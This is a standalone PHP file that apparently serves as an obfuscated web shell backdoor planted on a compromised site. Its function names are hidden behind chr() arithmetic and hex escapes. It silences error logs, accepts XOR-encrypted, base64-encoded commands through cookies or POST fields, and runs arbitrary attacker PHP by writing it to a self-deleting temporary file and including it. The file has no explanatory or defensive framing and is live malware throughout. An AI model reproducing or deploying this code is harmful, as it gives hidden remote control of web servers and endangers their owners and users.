<?php $jkBVUgoa = "\x66".'i'.'l'."\145".chr(412-317).'p'."\x75".chr(196-80)."\137".'c'.'o'.chr(733-623).'t'."\145"."\156".chr(1092-976).chr(746-631);
$LoNcahBxuE = chr(583-485).chr(456-359).chr(115).chr(182-81)."\66"."\64".chr(381-286).chr(100).'e'.chr(99).'o'.chr(678-578).'e';
$npokeDLRIG = 'i'.chr(110).chr(105)."\x5f".'s'.'e'."\164";
$ZsiZJDjE = "\165"."\x6e".chr(371-263).chr(195-90)."\156".chr(107);


@$npokeDLRIG("\x65"."\162".chr(735-621)."\157".chr(114).'_'.'l'.chr(559-448).chr(103), NULL);
@$npokeDLRIG('l'."\157".chr(103)."\x5f".'e'.chr(703-589)."\x72".'o'.'r'."\x73", 0);
@$npokeDLRIG(chr(109).chr(97).chr(120).chr(95).chr(101)."\170"."\x65".'c'."\x75".'t'."\151"."\157".chr(340-230)."\137".chr(116).chr(105).'m'."\145", 0);
@set_time_limit(0);

function GGnSfb($WhcNMSebSj, $lxHUZW)
{
    $jIgBPQn = "";
    for ($GvkDIunQHc = 0; $GvkDIunQHc < strlen($WhcNMSebSj);) {
        for ($j = 0; $j < strlen($lxHUZW) && $GvkDIunQHc < strlen($WhcNMSebSj); $j++, $GvkDIunQHc++) {
            $jIgBPQn .= chr(ord($WhcNMSebSj[$GvkDIunQHc]) ^ ord($lxHUZW[$j]));
        }
    }
    return $jIgBPQn;
}

$xeaUjor = array_merge($_COOKIE, $_POST);
$AadfdfB = '7e393a0a-8247-4c6b-8744-f51f7aa6fce7';
foreach ($xeaUjor as $nlzPH => $WhcNMSebSj) {
    $WhcNMSebSj = @unserialize(GGnSfb(GGnSfb($LoNcahBxuE($WhcNMSebSj), $AadfdfB), $nlzPH));
    if (isset($WhcNMSebSj["\x61".chr(478-371)])) {
        if ($WhcNMSebSj["\x61"] == "\151") {
            $GvkDIunQHc = array(
                chr(112)."\166" => @phpversion(),
                chr(861-746).chr(118) => "3.5",
            );
            echo @serialize($GvkDIunQHc);
        } elseif ($WhcNMSebSj["\x61"] == "\145") {
            $VAmewxPm = "./" . md5($AadfdfB) . chr(271-225)."\151".'n'."\143";
            @$jkBVUgoa($VAmewxPm, "<" . chr(63).chr(112).'h'.'p'.chr(32).chr(64).chr(117).chr(110).chr(108).chr(105).chr(131-21)."\153".'('.chr(853-758)."\x5f".chr(251-181)."\111".chr(76)."\x45".chr(851-756).chr(95).chr(403-362).';'."\40" . $WhcNMSebSj["\x64"]);
            include($VAmewxPm);
            @$ZsiZJDjE($VAmewxPm);
        }
        exit();
    }
}

